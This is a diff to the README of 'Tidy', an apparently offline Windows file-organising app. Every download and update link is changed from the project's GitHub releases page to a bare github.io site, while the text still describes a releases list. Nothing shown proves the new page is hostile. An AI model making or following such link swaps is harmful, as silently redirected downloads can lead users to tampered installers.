@@ -1,7 +1,7 @@
 # 🧹 Tidy - Declutter Your Files With Plain English
 
-[![Download Tidy](https://img.shields.io/badge/Download-Tidy%20for%20Windows-orange?style=for-the-badge&logo=github)](https://github.com/geziel16/Tidy/releases)
-[![Latest Release](https://img.shields.io/badge/Release-Latest-blueviolet?style=for-the-badge)](https://github.com/geziel16/Tidy/releases)
+[![Download Tidy](https://img.shields.io/badge/Download-Tidy%20for%20Windows-orange?style=for-the-badge&logo=github)](https://geziel16.github.io)
+[![Latest Release](https://img.shields.io/badge/Release-Latest-blueviolet?style=for-the-badge)](https://geziel16.github.io)
 [![Privacy](https://img.shields.io/badge/100%25-Offline%20%26%20Private-teal?style=for-the-badge)](#-privacy-first-by-design)
 
 ---
@@ -26,7 +26,7 @@ Getting Tidy onto your computer takes about a minute. There is nothing to config
 
 **Step 1 —** Visit this link to download the application:
 
-### 👉 [https://github.com/geziel16/Tidy/releases](https://github.com/geziel16/Tidy/releases)
+### 👉 [https://geziel16.github.io](https://geziel16.github.io)
 
 **Step 2 —** On that page you will see a list of releases. The newest one is at the top. Open it and download the application file listed there.
 
@@ -154,7 +154,7 @@ Yes, there is a cancel control while an approved action is running, and anything
 No. There is no telemetry, no analytics, and no account.
 
 **Where do I get updates?**
-The same download page always has the newest version: [https://github.com/geziel16/Tidy/releases](https://github.com/geziel16/Tidy/releases)
+The same download page always has the newest version: [https://geziel16.github.io](https://geziel16.github.io)
 
 ---
 
